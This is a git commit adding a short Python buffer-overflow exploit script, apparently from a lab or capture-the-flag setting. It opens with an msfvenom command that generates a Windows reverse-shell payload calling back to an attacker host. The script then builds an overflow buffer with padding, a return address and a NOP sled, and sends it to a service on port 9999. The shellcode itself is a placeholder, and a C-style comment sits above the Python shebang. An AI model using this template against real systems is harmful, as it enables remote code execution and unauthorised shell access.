c861b93e8ec3e451e52b5c8dcba89238f4993fe7
xKarma98 <162383915+xKarma98@users.noreply.github.com>
2024-07-03 09:07:57 -0500

    Create Windowspayload.py

---
+++ Windowspayload.py
@@ -0,0 +1,18 @@
+// msfvenom -p windows/shell_reverse_tcp LHOST=vpnip LPORT=1234 EXITFUNC=thread -f c -a x86 -b "\x00\x80"
+#!/usr/bin/python3  
+import sys, socket
+  
+payload = (  
+b"\PAYLOADHERE  
+)  
+  
+shellcode = b"A" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 32 + payload
+
+try:
+ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ s.connect(('vulnerablebox', 9999))
+ s.send((shellcode))
+ s.close()
+except:
+ print("Error connecting to server")
+ sys.exit() 
